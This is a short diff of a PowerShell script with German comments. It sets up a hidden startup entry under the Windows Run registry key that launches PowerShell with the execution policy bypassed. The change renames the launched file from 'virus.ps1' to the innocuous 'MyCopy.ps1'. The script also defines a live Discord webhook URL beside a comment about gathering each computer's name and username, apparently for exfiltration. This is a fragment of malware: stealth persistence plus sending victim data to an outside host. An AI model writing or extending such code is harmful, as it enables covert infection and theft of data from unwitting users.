@@ -5,7 +5,7 @@ $RegKeyPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 # Name des Registrierungswerts
 $ValueName = "MyStartupScript"
 # Daten für den Registrierungswert
-$ValueData = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$TargetPath\virus.ps1`""
+$ValueData = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$TargetPath\MyCopy.ps1`""
 #Webhook Url
 $webhookUrl = "https://discordapp.com/api/webhooks/1236328074887299145/nssyhlyQnpJCQ6az6hYDd3VtkfqHMMb3451H2XWgub9GQ-q668mUlMZ1dsngmSHjRvs9"
 #Computer und Username des jeweiligen Computers
